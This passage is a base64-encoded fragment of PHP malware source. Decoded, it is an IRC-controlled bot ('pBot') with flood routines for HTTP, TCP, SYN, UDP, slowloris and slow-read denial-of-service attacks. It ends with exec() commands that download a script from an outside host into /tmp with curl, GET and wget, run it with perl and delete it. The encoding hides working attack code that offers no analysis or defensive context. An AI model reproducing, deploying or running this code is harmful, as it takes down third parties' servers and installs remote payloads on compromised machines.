tPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCAiW1wyQ2xvdWRGbGFyZUZsb29kIEZpbmlzaGVkIVwyXSIpOwoKICAgIH0KCiAgICBwdWJsaWMgZnVuY3Rpb24gaHR0cGZsb29kKCRob3N0LCAkcG9ydCwgJHRpbWUsICRtZXRob2Q9IkdFVCIsICR1cmw9Ii8iKSB7CgogICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwgIltcMkh0dHBGbG9vZCBTdGFydGVkIVwyXSIpOwoKICAgICAgICAkdGltZWkgICAgPSB0aW1lKCk7CgogICAgICAgICR1c2VyX2FnZW50ID0gJHRoaXMtPnVzZXJfYWdlbnRzW3JhbmQoMCwgY291bnQoJHRoaXMtPnVzZXJfYWdlbnRzKS0xKV07CgogICAgICAgICRwYWNrZXQgPSAiJG1ldGhvZCAkdXJsIEhUVFAvMS4xXHJcbiI7CgogICAgICAgICRwYWNrZXQgLj0gIkhvc3Q6ICRob3N0XHJcbiI7CgogICAgICAgICRwYWNrZXQgLj0gIktlZXAtQWxpdmU6IDkwMFxyXG4iOwoKICAgICAgICAkcGFja2V0IC49ICJDYWNoZS1Db250cm9sOiBuby1jYWNoZVxyXG4iOwoKICAgICAgICAkcGFja2V0IC49ICJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZFxyXG4iOwoKICAgICAgICAkcGFja2V0IC49ICJBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LCovKjtxPTAuOFxyXG4iOwoKICAgICAgICAkcGFja2V0IC49ICJBY2NlcHQtTGFuZ3VhZ2U6IGVuLUdCLGVuLVVTO3E9MC44LGVuO3E9MC42XHJcbiI7CgogICAgICAgICRwYWNrZXQgLj0gIkFjY2VwdC1jaGFyc2V0OiBJU08tODg1OS0xLHV0Zi04O3E9MC43LCo7cT0wLjNcclxuIjsKCiAgICAgICAgJHBhY2tldCAuPSAiQ29ubmVjdGlvbjoga2VlcC1hbGl2ZVxyXG4iOwoKICAgICAgICAkcGFja2V0IC49ICJVc2VyLUFnZW50OiAkdXNlcl9hZ2VudFxyXG5cclxuIjsKCiAgICAgICAgd2hpbGUgKHRpbWUoKSAtICR0aW1laSA8ICR0aW1lKSB7CgogICAgICAgICAgICAkaGFuZGxlID0gZnNvY2tvcGVuKCRob3N0LCAkcG9ydCwgJGVycm5vLCAkZXJyc3RyLCAxKTsKCiAgICAgICAgICAgIGZ3cml0ZSgkaGFuZGxlLCAkcGFja2V0KTsKCiAgICAgICAgfQoKICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuJ10sICJbXDJIdHRwRmxvb2QgRmluaXNoZWQhXDJdIik7CgogICAgfQoKICAgIHB1YmxpYyBmdW5jdGlvbiBwcm94eWh0dHBmbG9vZCgkdXJsLCAkcHJveHlMaXN0VXJsLCAkdGltZSwgJG1ldGhvZD0iR0VUIikgewoKICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuJ10sICJbXDJQcm94eUh0dHBGbG9vZCBTdGFydGVkIVwyXSIpOwoKICAgICAgICAkdGltZWkgICAgPSB0aW1lKCk7CgogICAgICAgIC8vR3JhYmJpbmcgcHJveHkKCiAgICAgICAgJHByb3h5TGlzdCA9IGN1cmwoJHByb3h5TGlzdFVybCk7CgogICAgICAgIGlmICgkcHJveHlMaXN0KSB7CgogICAgICAgICAgICAkcHJveGllcyA9IGV4cGxvZGUoIlxuIiwgJHByb3h5TGlzdCk7CgogICAgICAgICAgICBpZiAoY291bnQoJHByb3hpZXMpKSB7CgogICAgICAgICAgICAgICAgc2h1ZmZsZSgkcHJveGllcyk7CgogICAgICAgICAgICAgICAgJHByb3hpZXNbMF0gPSB0cmltKCRwcm94aWVzWzBdKTsKCiAgICAgICAgICAgICAgICAkcHJveHkgPSBleHBsb2RlKCI6IiwgJHByb3hpZXNbMF0pOwoKICAgICAgICAgICAgICAgICRwcm94eUlwID0gJHByb3h5WzBdOwoKICAgICAgICAgICAgICAgICRwcm94eVBvcnQgPSAkcHJveHlbMV07CgogICAgICAgICAgICAgICAgaWYgKCRwcm94eVBvcnQgJiYgJHByb3h5SXApIHsKCiAgICAgICAgICAgICAgICAgICAgJHVzZXJfYWdlbnQgPSAkdGhpcy0+dXNlcl9hZ2VudHNbcmFuZCgwLCBjb3VudCgkdGhpcy0+dXNlcl9hZ2VudHMpLTEpXTsKCiAgICAgICAgICAgICAgICAgICAgJHBhY2tldCA9ICIkbWV0aG9kICR1cmwgIEhUVFAvMS4xXHJcbiI7CgogICAgICAgICAgICAgICAgICAgICRwYWNrZXQgLj0gIkhvc3Q6ICRob3N0XHJcbiI7CgogICAgICAgICAgICAgICAgICAgICRwYWNrZXQgLj0gIktlZXAtQWxpdmU6IDkwMFxyXG4iOwoKICAgICAgICAgICAgICAgICAgICAkcGFja2V0IC49ICJDYWNoZS1Db250cm9sOiBuby1jYWNoZVxyXG4iOwoKICAgICAgICAgICAgICAgICAgICAkcGFja2V0IC49ICJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZFxyXG4iOwoKICAgICAgICAgICAgICAgICAgICAkcGFja2V0IC49ICJBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LCovKjtxPTAuOFxyXG4iOwoKICAgICAgICAgICAgICAgICAgICAkcGFja2V0IC49ICJBY2NlcHQtTGFuZ3VhZ2U6IGVuLUdCLGVuLVVTO3E9MC44LGVuO3E9MC42XHJcbiI7CgogICAgICAgICAgICAgICAgICAgICRwYWNrZXQgLj0gIkFjY2VwdC1jaGFyc2V0OiBJU08tODg1OS0xLHV0Zi04O3E9MC43LCo7cT0wLjNcclxuIjsKCiAgICAgICAgICAgICAgICAgICAgJHBhY2tldCAuPSAiQ29ubmVjdGlvbjoga2VlcC1hbGl2ZVxyXG4iOwoKICAgICAgICAgICAgICAgICAgICAkcGFja2V0IC49ICJVc2VyLUFnZW50OiAkdXNlcl9hZ2VudFxyXG5cclxuIjsKCiAgICAgICAgICAgICAgICAgICAgd2hpbGUgKHRpbWUoKSAtICR0aW1laSA8ICR0aW1lKSB7CgogICAgICAgICAgICAgICAgICAgICAgICAkaGFuZGxlID0gZnNvY2tvcGVuKCRwcm94eUlwLCAkcHJveHlQb3J0LCAkZXJybm8sICRlcnJzdHIsIDEpOwoKICAgICAgICAgICAgICAgICAgICAgICAgZndyaXRlKCRoYW5kbGUsICRwYWNrZXQpOwoKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgfSBlbHNlIHsKCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCAiW1wyTWFsZm9ybWVkIHByb3h5IVwyXSIpOwoKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgIH0gZWxzZSB7CgogICAgICAgICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCAiW1wyTm8gcHJveGllcyBmb3VuZCFcMl0iKTsKCiAgICAgICAgICAgIH0KCiAgICAgICAgfSBlbHNlIHsKCiAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwgIltcMlByb3h5IExpc3Qgbm90IGZvdW5kIVwyXSIpOwoKICAgICAgICB9CgogICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwgIltcMlByb3h5SHR0cEZsb29kIEZpbmlzaGVkIChQcm94eTogIi4kcHJveGllc1swXS4iKSFcMl0iKTsKCiAgICB9CgogICAgcHVibGljIGZ1bmN0aW9uIHRjcGZsb29kKCRob3N0LCAkcG9ydCwgJHRpbWUpIHsKCiAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCAiW1wyVENQIFN0YXJ0ZWQhXDJdIik7CgogICAgICAgICR0aW1laSAgICA9IHRpbWUoKTsKCiAgICAgICAgJHBhY2tldCA9ICIiOwoKICAgICAgICBmb3IgKCRpID0gMDsgJGkgPCA2NTAwMDsgJGkrKykgewoKICAgICAgICAgICAgJHBhY2tldCAuPSAkdGhpcy0+Y2hhcnNldFtyYW5kKDAsIHN0cmxlbigkdGhpcy0+Y2hhcnNldCkpXTsKCiAgICAgICAgfQoKICAgICAgICB3aGlsZSAodGltZSgpIC0gJHRpbWVpIDwgJHRpbWUpIHsKCiAgICAgICAgICAgICRoYW5kbGUgPSBmc29ja29wZW4oInRjcDovLyIuJGhvc3QsICRwb3J0LCAkZXJybm8sICRlcnJzdHIsIDEpOwoKICAgICAgICAgICAgZndyaXRlKCRoYW5kbGUsICRwYWNrZXQpOwoKICAgICAgICB9CgogICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwgIltcMlRDUCBGaW5pc2hlZCFcMl0iKTsKCiAgICB9CgogICAgcHVibGljIGZ1bmN0aW9uIHNsb3dSZWFkKCRob3N0LCAkcG9ydCwgJHRpbWUpIHsKCiAgICAgICAgJHRpbWVpID0gdGltZSgpOwoKICAgICAgICAkZnMgICAgPSBhcnJheSgpOwoKICAgICAgICAvL2luaXRpYWxpemUgZ2V0IGhlYWRlcnMuCgogICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwgIltcMlN0YXJ0ZWQgU2xvd3JlYWQhXDJdIik7CgogICAgICAgICRoZWFkZXJzID0gIkdFVCAvIEhUVFAvMS4xXHJcbkhvc3Q6IHskaG9zdH1cclxuVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBXT1c2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzMxLjAuMTY1MC42MyBTYWZhcmkvNTM3LjM2XHJcblxyXG4iOwoKICAgICAgICB3aGlsZSAodGltZSgpIC0gJHRpbWVpIDwgJHRpbWUpIHsKCiAgICAgICAgICAgIGZvciAoJGkgPSAwOyAkaSA8IDEwMDsgJGkrKykgewoKICAgICAgICAgICAgICAgICRmc1skaV0gPSBAZnNvY2tvcGVuKCRob3N0LCAkcG9ydCwgJGVycm5vLCAkZXJyc3RyKTsKCiAgICAgICAgICAgICAgICBmd3JpdGUoJGZzWyRpXSwgJGhlYWRlcnMpOwoKICAgICAgICAgICAgfQoKICAgICAgICAgICAgd2hpbGUgKHRpbWUoKSAtICR0aW1laSA8ICR0aW1lKSB7CgogICAgICAgICAgICAgICAgZm9yICgkaSA9IDA7ICRpIDwgY291bnQoJGZzKTsgJGkrKykgewoKICAgICAgICAgICAgICAgICAgICBpZiAoISRmc1skaV0pIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICRmc1skaV0gPSBAZnNvY2tvcGVuKCRob3N0LCAkcG9ydCwgJGVycm5vLCAkZXJyc3RyKTsKCiAgICAgICAgICAgICAgICAgICAgICAgIGZ3cml0ZSgkZnNbJGldLCAkaGVhZGVycyk7CgogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgZnJlYWQoJGZzWyRpXSwgMSk7CgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIHNsZWVwKG10X3JhbmQoMC41LCAyKSk7CgogICAgICAgICAgICB9CgogICAgICAgIH0KCiAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCAiW1wyRmluaXNoZWQgU2xvd3JlYWRcMl0iKTsKCiAgICB9CgogICAgcHVibGljIGZ1bmN0aW9uIGF0dGFja19odHRwKCRtdGhkLCAkc2VydmVyLCAkdGltZSkgewoKICAgICAgICAkdGltZWkgPSB0aW1lKCk7CgogICAgICAgICRmcyAgICA9IGFycmF5KCk7CgogICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwgIltcMkxheWVyIDcgeyRtdGhkfSBBdHRhY2sgU3RhcnRlZCBPbiA6ICRzZXJ2ZXIhXDJdIik7CgogICAgICAgICRyZXF1ZXN0ID0gIiRtdGhkIC8gSFRUUC8xLjFcclxuIjsKCiAgICAgICAgJHJlcXVlc3QgLj0gIkhvc3Q6ICRzZXJ2ZXJcclxuIjsKCiAgICAgICAgJHJlcXVlc3QgLj0gIlVzZXItQWdlbnQ6IE1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDcuMDsgV2luZG93cyBOVDUuMTsgLk5FVCBDTFIgMS4xLjQzMjI7IC5ORVQgQ0xSIDIuMC41MDcyNylcclxuIjsKCiAgICAgICAgJHJlcXVlc3QgLj0gIktlZXAtQWxpdmU6IDkwMFxyXG4iOwoKICAgICAgICAkcmVxdWVzdCAuPSAiQWNjZXB0OiAqLipcclxuIjsKCiAgICAgICAgJHRpbWVpID0gdGltZSgpOwoKICAgICAgICBmb3IgKCRpID0gMDsgJGkgPCAxMDA7ICRpKyspIHsKCiAgICAgICAgICAgICRmc1skaV0gPSBAZnNvY2tvcGVuKCRzZXJ2ZXIsIDgwLCAkZXJybm8sICRlcnJzdHIpOwoKICAgICAgICB9CgogICAgICAgIHdoaWxlICgodGltZSgpIC0gJHRpbWVpIDwgJHRpbWUpKSB7CgogICAgICAgICAgICBmb3IgKCRpID0gMDsgJGkgPCAxMDA7ICRpKyspIHsKCiAgICAgICAgICAgICAgICBpZiAoQGZ3cml0ZSgkZnNbJGldLCAkcmVxdWVzdCkpIHsKCiAgICAgICAgICAgICAgICAgICAgY29udGludWU7CgogICAgICAgICAgICAgICAgfSBlbHNlIHsKCiAgICAgICAgICAgICAgICAgICAgJGZzWyRpXSA9IEBmc29ja29wZW4oJHNlcnZlciwgODAsICRlcnJubywgJGVycnN0cik7CgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgfQoKICAgICAgICB9CgogICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwgIltcMkxheWVyIDcgeyRtdGhkfSBBdHRhY2sgRmluaXNoZWQhXDJdIik7CgogICAgfQoKICAgIHB1YmxpYyBmdW5jdGlvbiBhdHRhY2tfcG9zdCgkc2VydmVyLCAkaG9zdCwgJHRpbWUpIHsKCiAgICAgICAgJHRpbWVpID0gdGltZSgpOwoKICAgICAgICAkZnMgICAgPSBhcnJheSgpOwoKICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuJ10sICJbXDJMYXllciA3IFBvc3QgQXR0YWNrIFN0YXJ0ZWQgT24gOiAkc2VydmVyIVwyXSIpOwoKICAgICAgICAkcmVxdWVzdCA9ICJQT1NUIC8iIC4gbWQ1KHJhbmQoKSkgLiAiIEhUVFAvMS4xXHJcbiI7CgogICAgICAgICRyZXF1ZXN0IC49ICJIb3N0OiAkaG9zdFxyXG4iOwoKICAgICAgICAkcmVxdWVzdCAuPSAiVXNlci1BZ2VudDogTW96aWxsYS80LjAgKGNvbXBhdGlibGU7IE1TSUUgNy4wOyBXaW5kb3dzIE5UNS4xOyAuTkVUIENMUiAxLjEuNDMyMjsgLk5FVCBDTFIgMi4wLjUwNzI3KVxyXG4iOwoKICAgICAgICAkcmVxdWVzdCAuPSAiS2VlcC1BbGl2ZTogOTAwXHJcbiI7CgogICAgICAgICRyZXF1ZXN0IC49ICJDb250ZW50LUxlbmd0aDogMTAwMDAwMDAwMFxyXG4iOwoKICAgICAgICAkcmVxdWVzdCAuPSAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWRcclxuIjsKCiAgICAgICAgJHJlcXVlc3QgLj0gIkFjY2VwdDogKi4qXHJcbiI7CgogICAgICAgIGZvciAoJGkgPSAwOyAkaSA8IDEwMDsgJGkrKykgewoKICAgICAgICAgICAgJGZzWyRpXSA9IEBmc29ja29wZW4oJGhvc3QsIDgwLCAkZXJybm8sICRlcnJzdHIpOwoKICAgICAgICB9CgogICAgICAgIHdoaWxlICgodGltZSgpIC0gJHRpbWVpIDwgJHRpbWUpKSB7CgogICAgICAgICAgICBmb3IgKCRpID0gMDsgJGkgPCAxMDA7ICRpKyspIHsKCiAgICAgICAgICAgICAgICBpZiAoQGZ3cml0ZSgkZnNbJGldLCAkcmVxdWVzdCkpIHsKCiAgICAgICAgICAgICAgICAgICAgY29udGludWU7CgogICAgICAgICAgICAgICAgfSBlbHNlIHsKCiAgICAgICAgICAgICAgICAgICAgJGZzWyRpXSA9IEBmc29ja29wZW4oJGhvc3QsIDgwLCAkZXJybm8sICRlcnJzdHIpOwoKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgIH0KCiAgICAgICAgfQoKICAgICAgICBmY2xvc2UoJHNvY2tmZCk7CgogICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwgIltcMkxheWVyIDcgUG9zdCBBdHRhY2sgRmluaXNoZWQhXDJdIik7CgogICAgfQoKICAgIHB1YmxpYyBmdW5jdGlvbiBkb1Nsb3coJGhvc3QsICR0aW1lKSB7CgogICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwgIltcMlNsb3dMb3JpcyBTdGFydGVkIVwyXSIpOwoKICAgICAgICAkdGltZWkgPSB0aW1lKCk7CgogICAgICAgICRpICAgICA9IDA7CgogICAgICAgIGZvciAoJGkgPSAwOyAkaSA8IDEwMDsgJGkrKykgewoKICAgICAgICAgICAgJGZzWyRpXSA9IEBmc29ja29wZW4oJGhvc3QsIDgwLCAkZXJybm8sICRlcnJzdHIpOwoKICAgICAgICB9CgogICAgICAgIHdoaWxlICgodGltZSgpIC0gJHRpbWVpIDwgJHRpbWUpKSB7CgogICAgICAgICAgICBmb3IgKCRpID0gMDsgJGkgPCAxMDA7ICRpKyspIHsKCiAgICAgICAgICAgICAgICAkb3V0ID0gIlBPU1QgLyBIVFRQLzEuMVxyXG4iOwoKICAgICAgICAgICAgICAgICRvdXQgLj0gIkhvc3Q6IHskaG9zdH1cclxuIjsKCiAgICAgICAgICAgICAgICAkb3V0IC49ICJVc2VyLUFnZW50OiBPcGVyYS85LjIxIChXaW5kb3dzIE5UIDUuMTsgVTsgZW4pXHJcbiI7CgogICAgICAgICAgICAgICAgJG91dCAuPSAiQ29udGVudC1MZW5ndGg6ICIgLiByYW5kKDEsIDEwMDApIC4gIlxyXG4iOwoKICAgICAgICAgICAgICAgICRvdXQgLj0gIlgtYTogIiAuIHJhbmQoMSwgMTAwMDApIC4gIlxyXG4iOwoKICAgICAgICAgICAgICAgIGlmIChAZndyaXRlKCRmc1skaV0sICRvdXQpKSB7CgogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOwoKICAgICAgICAgICAgICAgIH0gZWxzZSB7CgogICAgICAgICAgICAgICAgICAgICRmc1skaV0gPSBAZnNvY2tvcGVuKCRzZXJ2ZXIsIDgwLCAkZXJybm8sICRlcnJzdHIpOwoKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgIH0KCiAgICAgICAgfQoKICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuJ10sICJbXDJTbG93TG9yaXMgRmluaXNoZWQhXDJdIik7CgogICAgfQoKICAgIHB1YmxpYyBmdW5jdGlvbiBzeW4oJGhvc3QsICRwb3J0LCAkdGltZSwgJGRlbGF5PTEpIHsKCiAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCAiW1wyU1lOIFN0YXJ0ZWQhXDJdIik7CgogICAgICAgICR0aW1laSAgICA9IHRpbWUoKTsKCiAgICAgICAgJHNvY2tzID0gYXJyYXkoKTsKCiAgICAgICAgd2hpbGUgKHRpbWUoKSAtICR0aW1laSA8ICR0aW1lKSB7CgogICAgICAgICAgICAkbnVtc29ja3MrKzsKCiAgICAgICAgICAgICRzb2Nrc1skbnVtc29ja3NdID0gQHNvY2tldF9jcmVhdGUoQUZfSU5FVCwgU09DS19TVFJFQU0sIFNPTF9UQ1ApOwoKICAgICAgICAgICAgaWYgKCEkc29ja3NbJG51bXNvY2tzXSkgY29udGludWU7CgogICAgICAgICAgICBAc29ja2V0X3NldF9ub25ibG9jaygkc29ja3NbJG51bXNvY2tzXSk7CgogICAgICAgICAgICBmb3IgKCRqID0gMDsgJGogPCAyMDsgJGorKykKCiAgICAgICAgICAgICAgICBAc29ja2V0X2Nvbm5lY3QoJHNvY2tzWyRudW1zb2Nrc10sICRob3N0LCAkcG9ydCk7CgogICAgICAgICAgICBzbGVlcCgkZGVsYXkpOwoKICAgICAgICB9CgogICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwgIltcMlNZTiBGaW5pc2hlZCAoIi4kbnVtc29ja3MuIiBzb2NrcyBjcmVhdGVkKSFcMl0iKTsKCiAgICB9CgogICAgcHVibGljIGZ1bmN0aW9uIHN5bmZsb29kKCRob3N0LCAkcG9ydCwgJGRlbGF5KSB7CgogICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwgIltcMnN5bkZsb29kIFN0YXJ0ZWQhXDJdIik7CgogICAgICAgICRzb2NrcyAgICA9IGFycmF5KCk7CgogICAgICAgICRudW1zb2NrcyA9IDA7CgogICAgICAgICRudW1zb2NrcysrOwoKICAgICAgICAkc29ja3NbJG51bXNvY2tzXSA9IHNvY2tldF9jcmVhdGUoQUZfSU5FVCwgU09DS19TVFJFQU0sIFNPTF9UQ1ApOwoKICAgICAgICBpZighJHNvY2tzWyRudW1zb2Nrc10pCgogICAgICAgICAgICBjb250aW51ZTsKCiAgICAgICAgQHNvY2tldF9zZXRfbm9uYmxvY2soJHNvY2tzWyRudW1zb2Nrc10pOwoKICAgICAgICBmb3IoJGogPSAwOyAkaiA8IDIwOyAkaisrKQoKICAgICAgICAgICAgQHNvY2tldF9jb25uZWN0KCRzb2Nrc1skbnVtc29ja3NdLCAkaG9zdCwgJHBvcnQpOwoKICAgICAgICBzbGVlcCgkZGVsYXkpOwoKICAgICAgICBmb3IgKCRqID0gMDsgJGogPCAkbnVtc29ja3M7ICRqKyspIHsKCiAgICAgICAgICAgIGlmKCRzb2Nrc1skal0pCgogICAgICAgICAgICAgICAgQHNvY2tldF9jbG9zZSgkc29ja3NbJGpdKTsKCiAgICAgICAgfQoKICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuJ10sICJbXDJTeW5GbG9vZCBGaW5pc2hlZCFcMl06IENvbmZpZyAtIEZvciAkaG9zdDokcG9ydC4iKTsKCiAgICB9CgogICAgcHVibGljIGZ1bmN0aW9uIHVkcGZsb29kKCRob3N0LCAkcG9ydCwgJHRpbWUsICRwYWNrZXRzaXplKSB7CgogICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwgIltcMiNUS0ggLT4gQXRhY3VsIGEgZm9zdCBpbml0aWF0IVwyXSIpOwoKICAgICAgICAkcGFja2V0ID0gIiI7CgogICAgICAgIGZvciAoJGkgPSAwOyAkaSA8ICRwYWNrZXRzaXplOyAkaSsrKSB7CgogICAgICAgICAgICAkcGFja2V0IC49IGNocihyYW5kKDEsIDI1NikpOwoKICAgICAgICB9CgogICAgICAgICRlbmQgPSB0aW1lKCkgKyAkdGltZTsKCiAgICAgICAgJGkgICA9IDA7CgogICAgICAgICRmcCAgPSBmc29ja29wZW4oInVkcDovLyIgLiAkaG9zdCwgJHBvcnQsICRlLCAkcywgNSk7CgogICAgICAgIHdoaWxlICh0cnVlKSB7CgogICAgICAgICAgICBmd3JpdGUoJGZwLCAkcGFja2V0KTsKCiAgICAgICAgICAgIGZmbHVzaCgkZnApOwoKICAgICAgICAgICAgaWYgKCRpICUgMTAwID09IDApIHsKCiAgICAgICAgICAgICAgICBpZigkZW5kIDwgdGltZSgpKQoKICAgICAgICAgICAgICAgICAgICBicmVhazsKCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRpKys7CgogICAgICAgIH0KCiAgICAgICAgZmNsb3NlKCRmcCk7CgogICAgICAgICRlbnYgPSAkaSAqICRwYWNrZXRzaXplOwoKICAgICAgICAkZW52ID0gJGVudiAvIDEwNDg1NzY7CgogICAgICAgICR2ZWwgPSAkZW52IC8gJHRpbWU7CgogICAgICAgICR2ZWwgPSByb3VuZCgkdmVsKTsKCiAgICAgICAgJGVudiA9IHJvdW5kKCRlbnYpOwoKICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuJ10sICJbXDIjVEtIIC0+IEF0YWMgdGVybWluYXQgY3Ugc3VjY2VzIVwyXTogIiAuICRlbnYgLiAiIE1CIHRyaW1pc2kgLyBNZWRpZTogIiAuICR2ZWwgLiAiIE1CL3MgIik7CgogICAgfQoKICAgIHB1YmxpYyBmdW5jdGlvbiB0Y3Bjb25uKCRob3N0LCAkcG9ydCwgJHRpbWUpIHsKCiAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCAiW1wyI1RLSCAtPiAhXDJdIik7CgogICAgICAgICRlbmQgPSB0aW1lKCkgKyAkdGltZTsKCiAgICAgICAgJGkgICA9IDA7CgogICAgICAgIHdoaWxlICgkZW5kID4gdGltZSgpKSB7CgogICAgICAgICAgICAkZnAgPSBmc29ja29wZW4oJGhvc3QsICRwb3J0LCAkZHVtbXksICRkdW1teSwgMSk7CgogICAgICAgICAgICBmY2xvc2UoJGZwKTsKCiAgICAgICAgICAgICRpKys7CgogICAgICAgIH0KCiAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCAiW1wyVGNwRmxvb2QgRmluaXNoZWQhXDJdOiBzZW50ICIgLiAkaSAuICIgY29ubmVjdGlvbnMgdG8gJGhvc3Q6JHBvcnQuIik7CgogICAgfQoKfQoKJGJvdCA9IG5ldyBwQm90OwoKJGJvdC0+c3RhcnQoJGNmZyk7CgoKCmZ1bmN0aW9uIGN1cmwoJHVybCwgJHBvc3Q9YXJyYXkoKSwgJHVzZXJfYWdlbnQ9IiIsICRkZWxldGVDb29raWVzPWZhbHNlKSB7CgogICAgJGNoID0gY3VybF9pbml0KCR1cmwpOwoKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgdHJ1ZSk7CgogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybCk7CgogICAgaWYgKCR1c2VyX2FnZW50KSB7CgogICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VU0VSQUdFTlQsICR1c2VyX2FnZW50KTsKCiAgICB9CgogICAgaWYgKCFlbXB0eSgkcG9zdCkpIHsKCiAgICAgICAgY3VybF9zZXRvcHQoJGNoLENVUkxPUFRfUE9TVCwgMSk7CgogICAgICAgIGN1cmxfc2V0b3B0KCRjaCxDVVJMT1BUX1BPU1RGSUVMRFMsICRwb3N0KTsKCiAgICB9CgogICAgaWYgKCRkZWxldGVDb29raWVzKSB7CgogICAgICAgIGZpbGVfcHV0X2NvbnRlbnRzKCJjb29raWUudHh0IiwgIiIpOwoKICAgIH0KCiAgICBjdXJsX3NldG9wdCAoJGNoLCBDVVJMT1BUX0NPT0tJRUpBUiwgImNvb2tpZS50eHQiKTsKCiAgICBjdXJsX3NldG9wdCAoJGNoLCBDVVJMT1BUX0NPT0tJRUZJTEUsICJjb29raWUudHh0Iik7CgogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLCB0cnVlKTsKCiAgICAkcmVzdWx0ID0gY3VybF9leGVjKCRjaCk7CgogICAgLy8kc3RhdHVzQ29kZSA9IGN1cmxfZ2V0aW5mbygkY2gsIENVUkxJTkZPX0hUVFBfQ09ERSk7CgogICAgY3VybF9jbG9zZSgkY2gpOwoKCgogICAgcmV0dXJuICRyZXN1bHQ7Cgp9CgoKCmZ1bmN0aW9uIGdldF9iZXR3ZWVuKCRzdHJpbmcsJHN0YXJ0LCRlbmQpIHsKCiAgICAkc3RyaW5nID0gIiAiLiRzdHJpbmc7CgogICAgJGluaSA9IHN0cnBvcygkc3RyaW5nLCAkc3RhcnQpOwoKICAgIGlmKCRpbmk9PTApIHJldHVybiAiIjsKCiAgICAkaW5pICs9IHN0cmxlbigkc3RhcnQpOwoKICAgICRsZW4gPSBzdHJwb3MoJHN0cmluZywgJGVuZCwgJGluaSkgLSAkaW5pOwoKCgogICAgcmV0dXJuIHN1YnN0cigkc3RyaW5nLCAkaW5pLCAkbGVuKTsKCn0KCgokdXJsPSJodHRwOi8veS5zaWx2ZXJsb3Jkcy5vcmcvIjsKZXhlYygnY2QgL3RtcDtjdXJsIC1PICcuJHVybC4ncmVhZC50eHQ7cGVybCByZWFkLnR4dDtybSAtZiByZWFkLnR4dCo7Jyk7CmV4ZWMoJ2NkIC90bXA7R0VUICcuJHVybC4ncmVhZC50eHQgPiByZWFkLnR4dDtwZXJsIHJlYWQudHh0O3JtIC1mIHJlYWQudHh0KjsnKTsKZXhlYygnY2QgL3RtcDt3Z2V0ICcuJHVy